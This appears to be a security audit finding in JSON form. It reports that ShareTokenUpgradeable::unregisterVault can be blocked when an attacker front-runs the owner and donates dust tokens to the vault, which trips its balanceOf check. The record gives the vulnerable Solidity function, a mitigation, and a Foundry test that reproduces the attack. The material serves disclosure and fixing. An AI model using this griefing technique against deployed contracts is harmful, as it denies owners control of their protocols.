  "title": "Attackers can DoS the `ShareTokenUpgradeable::unregisterVault` by front running and directly transferring asset in the vault",
  "severity": "medium",
  "validity": "valid",
  "quality": "sufficient",
  "user_handle": "ahahaHard1k",
  "body": "## Finding description\nWhen unregistering a vault there are some checks made in the function before the function can finish executing- one of those checks is that the transaction will rvert if the vault has any balance i.e `balanceOf > 0`.\n```solidity\n    function unregisterVault(address asset) external onlyOwner {\n        if (asset == address(0)) revert ZeroAddress();\n        ShareTokenStorage storage $ = _getShareTokenStorage();\n\n        (bool exists, address vaultAddress) = $.assetToVault.tryGet(asset);\n        if (!exists) revert AssetNotRegistered();\n\n        // COMPREHENSIVE SAFETY CHECK: Ensure vault has no user funds at risk\n        // This covers pending deposits, claimable redemptions, ERC7887 cancelations, and any remaining assets\n\n        // 1. Check vault metrics for pending requests, active users, and ERC7887 cancelation assets\n        try IVaultMetrics(vaultAddress).getVaultMetrics() returns (IVaultMetrics.VaultMetrics memory metrics) {\n            if (metrics.isActive) revert CannotUnregisterActiveVault();\n            if (metrics.totalPendingDepositAssets != 0) {\n                revert CannotUnregisterVaultPendingDeposits();\n            }\n            if (metrics.totalClaimableRedeemAssets != 0) {\n                revert CannotUnregisterVaultClaimableRedemptions();\n            }\n            if (metrics.totalCancelDepositAssets != 0) {\n                revert CannotUnregisterVaultAssetBalance();\n            }\n            if (metrics.activeDepositRequestersCount != 0) {\n                revert CannotUnregisterVaultActiveDepositRequesters();\n            }\n            if (metrics.activeRedeemRequestersCount != 0) {\n                revert CannotUnregisterVaultActiveRedeemRequesters();\n            }\n        } catch {\n            // If we can't get vault metrics, we can't safely verify no pending requests\n            revert CannotUnregisterActiveVault();\n        }\n        // 2. Final safety: Check raw asset balance in vault contract\n        // This catches any remaining assets including investments and edge cases\n        // If this happens, there is either a bug in the vault\n        // or assets were sent to the vault without directly\n        if (IERC20(asset).balanceOf(vaultAddress) != 0) {\n            revert CannotUnregisterVaultAssetBalance();\n        } // AUDIT: DoS via front running and directly donating dust\n```\n\nA malicious user can exploit this by front running the owner's tx of `unregisterVault` by directly transferring dust amount of asset to the vault which will make the balance of the contract non zero resulting in DoS\n\n## Impact\nDenial of service of core functionality of the protocol. If by any reason the owner wants to remove the vault, he wont be able to do so\n\n## Recommended mitigation steps\nInstead of checking balanceOf directly just maybe just check the total assets and the pending claimable assets and shares. Just exclude the balanceOf check since its manipulable",
  "proof_of_concept": "Paste the below test in `ComprehensiveERC7540ERC7575Test.t.sol` and run with forge test\n\n```solidity\nfunction test_VaultUnregisterDoSViaFrontRun() public {\n        // Setup: Give alice some shares first\n        uint256 depositAssets = 1000e18;\n        vm.startPrank(alice);\n        asset.approve(address(vault), depositAssets);\n        vault.requestDeposit(depositAssets, alice, alice);\n        vm.stopPrank();\n\n        vm.prank(owner);\n        vault.fulfillDeposit(alice, depositAssets);\n\n        vm.prank(alice);\n        uint shares = vault.deposit(depositAssets, alice);\n        assertEq(vault.getActiveDepositRequesters().length, 0);\n\n        // Request redeem\n        vm.prank(alice);\n        vault.requestRedeem(shares, alice, alice);\n\n        //fulfill\n        vm.prank(owner);\n        vault.fulfillRedeem(alice, shares);\n\n        vm.prank(alice); // redeem, which will make the contract bal 0\n        vault.redeem(shares, alice, alice);\n        assertEq(asset.balanceOf(address(vault)), 0);\n        // First deactivate existing vault, then unregister\n        vm.prank(owner);\n        vault.setVaultActive(false); // deactivate the vault in order to unregister it later\n        // owner tries to unregister, but alice front runs his tx by sending dust amount directly into the vault\n        vm.prank(alice);\n        asset.mint(address(vault), 10e18);\n        // owner's tx will revert due to vault's balance being != 0\n        vm.prank(owner);\n        vm.expectRevert();\n        shareToken.unregisterVault(address(asset));\n    }\n```",
